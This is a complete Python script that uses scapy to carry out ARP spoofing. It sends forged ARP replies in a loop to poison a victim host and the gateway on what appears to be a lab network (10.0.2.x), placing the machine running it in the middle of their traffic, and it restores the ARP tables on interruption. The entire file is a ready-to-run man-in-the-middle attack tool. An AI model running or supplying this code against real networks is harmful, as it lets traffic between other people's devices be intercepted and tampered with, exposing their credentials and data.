#!/usr/bin/env python

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

#op=2 means you want to create ARP response
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)

sent_packets_count = 0
#Try to execute while loop and also accept keyboard interruption as legal operation
try:
    while True:
        spoof("10.0.2.23", "10.0.2.1")
        spoof("10.0.2.1", "10.0.2.23")
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets sent: " + str(sent_packets_count), end="") #\r Start printing formbegining line
        time.sleep(2) #Make pause of 2 sec, before send another packet
except KeyboardInterrupt:
    print("[-] Detected CTRL + C .... Restoring ARP Table.")
    restore("10.0.2.23", "10.0.2.1")
    restore("10.0.2.1", "10.0.2.23")

